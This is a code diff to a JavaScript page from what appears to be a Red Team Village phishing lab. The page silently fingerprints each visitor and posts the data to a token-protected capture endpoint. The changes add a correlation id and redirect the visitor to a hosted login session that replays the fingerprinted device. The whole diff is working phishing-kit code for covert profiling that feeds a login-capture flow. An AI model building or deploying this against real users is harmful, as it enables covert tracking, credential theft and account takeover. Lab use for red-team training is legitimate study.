@@ -54,10 +54,33 @@ window.FingerprintJSLoaded = false;
 <script>
 const CONFIG = {
   site_id:       "silent-fp",                              // credential key prefix
-  token:         "test_external_capture_token",            // must match proxy token
-  endpoint:      "https://example.com/api/capture/external",  // capture endpoint
-  redirect_url:  "https://www.microsoft.com/",             // where to redirect
+  // DEF CON RTV lab: same-origin relative path (works through nginx
+  // regardless of domain) + the token docker-compose.yml sets via
+  // EXTERNAL_CAPTURE_TOKEN. Keep these two in sync if you change either.
+  token:         "lab-demo-capture-token",                 // must match proxy token
+  endpoint:      "/api/capture/external",                  // capture endpoint
+  // Funnel the visitor into the hosted login session after capture. The
+  // correlation id (see getCid) is appended so the follow-on session
+  // replays the device we just fingerprinted — the silent-capture ⇄
+  // login tie. Point this at a real IdP for a plain recon redirect; the
+  // cid rides along harmlessly and is simply ignored by a destination
+  // that doesn't understand it.
+  redirect_url:  "/start",                                 // where to redirect
 };
+
+// Correlation id: reuse an incoming ?cid= (so a chain of recon pages keeps
+// one id) or mint a fresh one. crypto.randomUUID needs a secure context
+// (the lab is HTTPS); fall back to a random hex string otherwise.
+function getCid() {
+  try {
+    const existing = new URLSearchParams(location.search).get("cid");
+    if (existing) return existing;
+  } catch (_) {}
+  try {
+    if (crypto && crypto.randomUUID) return crypto.randomUUID();
+  } catch (_) {}
+  return "cid-" + Math.random().toString(16).slice(2) + Date.now().toString(16);
+}
 
 async function fingerprint() {
   const fp = {
@@ -130,6 +153,7 @@ async function fingerprint() {
 
 async function captureAndSubmit() {
   console.log('[silent] Starting silent fingerprint capture...');
+  const cid = getCid();
 
   try {
     const fp = await fingerprint();
@@ -139,6 +163,7 @@ async function captureAndSubmit() {
       site_id: CONFIG.site_id,
       user: "silent-capture",
       source_url: location.href,
+      cid: cid,
       captured_inputs: {
         fingerprint: fp,
       },
@@ -165,10 +190,16 @@ async function captureAndSubmit() {
     console.error('[silent] Error during capture:', e.message);
   }
 
-  // Always redirect (success or fail)
+  // Always redirect (success or fail), carrying the cid so the follow-on
+  // session can find this capture. Append with the correct separator and
+  // don't double-add if redirect_url already carries a cid.
   setTimeout(() => {
-    console.log('[silent] Redirecting to:', CONFIG.redirect_url);
-    window.location.href = CONFIG.redirect_url;
+    let dest = CONFIG.redirect_url;
+    if (cid && !/[?&]cid=/.test(dest)) {
+      dest += (dest.indexOf("?") >= 0 ? "&" : "?") + "cid=" + encodeURIComponent(cid);
+    }
+    console.log('[silent] Redirecting to:', dest);
+    window.location.href = dest;
   }, 500);
 }
 
